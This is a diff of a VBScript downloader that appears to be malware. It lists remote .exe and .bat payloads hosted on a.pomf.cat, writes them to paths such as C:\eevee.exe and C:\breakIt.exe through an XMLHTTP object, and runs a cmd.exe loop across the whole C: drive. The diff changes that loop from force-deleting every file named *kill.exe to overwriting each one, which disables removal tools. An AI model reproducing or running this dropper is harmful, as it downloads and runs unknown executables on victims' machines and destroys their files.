@@ -3,14 +3,12 @@ Dim list
 Set list = CreateObject("System.Collections.ArrayList")
 	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee
 	list.Add "http://a.pomf.cat/utoojo.exe"        'installer
-	list.Add "https://a.pomf.cat/ayunww.bat"
+	list.Add "https://a.pomf.cat/ayunww.bat"	   'the equalizer
 
 names = "C:\eevee.exe"
 i = 0
 Set oShell = WScript.CreateObject ("WScript.Shell")
-oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (*kill.exe) do del /f/s/q ""%i"" START"
-oShell.run "cmd.exe /c del"
-
+oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (*kill.exe) do echo .> ""%i"" START"
 
 strHDLocation = "C:\breakIt.exe"
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
